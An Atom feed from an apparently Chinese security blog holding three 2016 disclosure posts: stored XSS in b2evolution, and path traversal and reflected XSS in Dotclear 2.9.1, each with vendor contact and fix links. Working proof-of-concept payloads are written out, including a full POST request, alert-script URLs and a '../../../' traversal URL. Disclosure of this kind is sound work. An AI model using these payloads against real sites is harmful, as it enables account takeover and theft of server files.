<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

 <title>储藏间</title>
 <link href="http://localhost:4000/atom.xml" rel="self"/>
 <link href="http://localhost:4000/"/>
 <updated>2016-12-28T11:45:31+08:00</updated>
 <id>http://localhost:4000</id>
 <author>
   <name>kevinoclam</name>
   <email></email>
 </author>

 
 <entry>
   <title>B2evolution v6.4.7 XSS</title>
   <link href="http://localhost:4000/2016/12/28/b2evolution_xss/"/>
   <updated>2016-12-28T00:00:00+08:00</updated>
   <id>http://localhost:4000/2016/12/28/b2evolution_xss</id>
   <content type="html">&lt;p&gt;发现者: 陈瑞琦&lt;/p&gt;

&lt;p&gt;发现日期: 2016-08-09&lt;/p&gt;

&lt;p&gt;下载地址: &lt;a href=&quot;http://b2evolution.net/downloads/&quot;&gt;b2evolution&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;作者: b2evolution.net&lt;/p&gt;

&lt;p&gt;作者通知日期: 2016-08-09&lt;/p&gt;

&lt;p&gt;作者联系手段: http://b2evolution.net/?disp=msgform&lt;/p&gt;

&lt;p&gt;CVE-ID：CVE-2016-6821&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Discription:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;b2evolution is a content and community management system written in PHP and backed by a MySQL database. It is distributed as free software under the GNU General Public License.
b2evolution originally started as a multi-user multi-blog engine when Fran?ois Planque forked b2evolution from version 0.6.1 of b2/cafelog in 2003.[2] A more widely known fork of b2/cafelog is WordPress. b2evolution is available in web host control panels as a “one click install” web app.&lt;a href=&quot;Wiki&quot;&gt;3&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Vulnerability:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;There is stored XSS in b2evolution version 6.7.4
Any user can edit his or her twitter infomation at ‘User Profile’ with some evil code.
And when the admin see the user profile at back-office, the page is lack of filter to protect the admin.&lt;/p&gt;

&lt;p&gt;Step 1 : Register a user of the web-site
Step 2 : Edit the twitter at http://192.168.204.128/b2evolution/index.php?disp=profile with something like https://twitter.com/kevino”onmouseover=”alert(1)”onerror=1
Step 3 : Save the changes
Step 4 : The admin view the profile in back-office at http://192.168.204.128/b2evolution/admin.php?ctrl=users , when the mouse over the content, the XSS code runs.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;PoC Code:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;code&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;
POST /b2evolution/htsrv/profile_update.php HTTP/1.1
Host: 192.168.204.128
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:47.0) Gecko/20100101 Firefox/47.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.204.128/b2evolution/index.php?disp=profile
Cookie: session_b2evo_192_168_204_128=49_I0EnVHgDXBKjsJd0e8fEhK6Ga82xEGDt; __smToken=AhuNTZNC8BaMfAVQV7ZpTW5a; evo_style=Variation
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 653

edited_user_login=kevino&amp;amp;edited_user_firstname=kevino&amp;amp;edited_user_lastname=kevino&amp;amp;edited_user_nickname=kevino&amp;amp;edited_user_gender=M&amp;amp;edited_user_ctry_ID=&amp;amp;edited_user_rgn_ID=&amp;amp;edited_user_subrg_ID=&amp;amp;edited_user_city_ID=&amp;amp;edited_user_age_min=&amp;amp;edited_user_age_max=&amp;amp;organizations%5B%5D=&amp;amp;uf_38=kevino&amp;amp;uf_39=kevino&amp;amp;uf_40=kevino&amp;amp;uf_41=https%3A%2F%2Ftwitter.com%2Fkevino%22onmouseover%3D%22alert%281%29%22onerror%3D%221&amp;amp;uf_42=https%3A%2F%2Ffacebook.com%2Fkevino&amp;amp;uf_43=http%3A%2F%2Fkevino.net%2Fkevino&amp;amp;new_field_type=3&amp;amp;actionArray%5Bupdate%5D=Save+Changes%21&amp;amp;crumb_user=CQ7LjBDKmMin8zqBDl050nNEbmINmIGi&amp;amp;user_tab=profile&amp;amp;identity_form=1&amp;amp;user_ID=8&amp;amp;blog=1&amp;amp;orig_user_ID=8&amp;amp;12_3=456

&amp;lt;/pre&amp;gt;&lt;/code&gt;

**Fix Code:**
Update to the version 6.7.5
https://github.com/b2evolution/b2evolution/commit/83c40129f471b659755491a02b2ad981995d37c1
&lt;/pre&gt;
</content>
 </entry>
 
 <entry>
   <title>Dotclear v2.9.1 路径遍历</title>
   <link href="http://localhost:4000/2016/12/27/dotclear-path_travel/"/>
   <updated>2016-12-27T00:00:00+08:00</updated>
   <id>http://localhost:4000/2016/12/27/dotclear-path_travel</id>
   <content type="html">&lt;p&gt;发现者: 陈瑞琦&lt;/p&gt;

&lt;p&gt;发现日期: 2016-08-01&lt;/p&gt;

&lt;p&gt;下载地址: &lt;a href=&quot;https://dotclear.org/download&quot;&gt;dotclear&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;作者: dotclear.org&lt;/p&gt;

&lt;p&gt;作者通知日期: 2016-08-01&lt;/p&gt;

&lt;p&gt;作者联系手段: security@dotclear.net&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;描述:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Dotclear is an open source blog publishing application distributed under the GNU GPLv2. Developed originally by Olivier Meunier from 2002, Dotclear has now attracted a solid team of developers.[2] It is relatively popular in French speaking countries, where it is used by several major blogging platforms (Gandi Blogs,[3] Marine nationale,[4] etc.).(Wiki)&lt;/p&gt;

&lt;p&gt;&lt;em&gt;渣翻&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Dotclear是一个基于GUN GPLv2的开源博客发布应用。在2002年由Olivier Meunier开发，现在已经吸引了一大个开发团队。在法语国家非常流行，并且为几个大型博客平台所用。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;细节:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;在media.php这儿有个路径遍历问题&lt;/p&gt;

&lt;p&gt;/admin/media.php&lt;/p&gt;

&lt;p&gt;line 172 ~ line193&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;code&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
if (!empty($_GET['zipdl']) &amp;amp;&amp;amp; $core-&amp;gt;auth-&amp;gt;check('media_admin',$core-&amp;gt;blog-&amp;gt;id))
{
	try
	{
		@set_time_limit(300);
		$fp = fopen('php://output','wb');
		$zip = new fileZip($fp);
		$zip-&amp;gt;addExclusion('#(^|/).(.*?)_(m|s|sq|t).jpg$#');
		$zip-&amp;gt;addDirectory($core-&amp;gt;media-&amp;gt;root.'/'.$d,'',true);

		header('Content-Disposition: attachment;filename='.date('Y-m-d').'-'.$core-&amp;gt;blog-&amp;gt;id.'-'.($d ? $d : 'media').'.zip');
		header('Content-Type: application/x-zip');
		$zip-&amp;gt;write();
		unset($zip);
		exit;
	}
	catch (Exception $e)
	{
		$core-&amp;gt;error-&amp;gt;add($e-&amp;gt;getMessage());
	}
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;在参数$d这儿少了过滤，”../”应该删掉&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;PoC&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;http://192.168.204.130/dotclear/admin/media.php?popup=0&amp;amp;select=0&amp;amp;zipdl=1&amp;amp;d=../../../&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Fix&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;https://hg.dotclear.org/dotclear/rev/282b26727770&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Dotclear v2.9.1反射型xss</title>
   <link href="http://localhost:4000/2016/12/26/dotclear-xss/"/>
   <updated>2016-12-26T00:00:00+08:00</updated>
   <id>http://localhost:4000/2016/12/26/dotclear-xss</id>
   <content type="html">&lt;p&gt;发现者: 陈瑞琦&lt;/p&gt;

&lt;p&gt;发现日期: 2016-08-01&lt;/p&gt;

&lt;p&gt;下载地址: &lt;a href=&quot;https://dotclear.org/download&quot;&gt;dotclear&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;作者: dotclear.org&lt;/p&gt;

&lt;p&gt;作者通知日期: 2016-08-01&lt;/p&gt;

&lt;p&gt;作者联系手段: security@dotclear.net&lt;/p&gt;

&lt;p&gt;CVE ID: CVE-2016-6523&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;描述:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Dotclear is an open source blog publishing application distributed under the GNU GPLv2. Developed originally by Olivier Meunier from 2002, Dotclear has now attracted a solid team of developers.[2] It is relatively popular in French speaking countries, where it is used by several major blogging platforms (Gandi Blogs,[3] Marine nationale,[4] etc.).(Wiki)&lt;/p&gt;

&lt;p&gt;&lt;em&gt;渣翻&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Dotclear是一个基于GUN GPLv2的开源博客发布应用。在2002年由Olivier Meunier开发，现在已经吸引了一大个开发团队。在法语国家非常流行，并且为几个大型博客平台所用。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;细节:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Dotclear v2.9.1 有一个反射型xss&lt;/p&gt;

&lt;p&gt;/admin/media.php&lt;/p&gt;

&lt;p&gt;line 34 $link_type = !empty($_REQUEST[‘link_type’]) ? $_REQUEST[‘link_type’] : null;&lt;/p&gt;

&lt;p&gt;line 62 $q = isset($_REQUEST[‘q’]) ? $_REQUEST[‘q’] : null;&lt;/p&gt;

&lt;p&gt;link_type 跟 q 参数缺少安全过滤&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;PoC:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;http://172.16.146.130/dotclear/admin/media.php?q=77777%3C%2Fspan%3E%3Cscript%3Ealert(1)%3C/script%3E&amp;amp;popup=0&amp;amp;select=0&amp;amp;plugin_id=&amp;amp;post_id=&amp;amp;link_type=&lt;/p&gt;

&lt;p&gt;http://172.16.146.130/dotclear/admin/media.php?q=77777&amp;amp;popup=0&amp;amp;select=0&amp;amp;plugin_id=&amp;amp;post_id=&amp;amp;link_type=8888%22%3E%3Cscript%3Ealert(1)%3C/script%3E&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;修复方案:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;https://hg.dotclear.org/dotclear/rev/40d0207e520d&lt;/p&gt;
</content>
 </entry>
 

</feed>
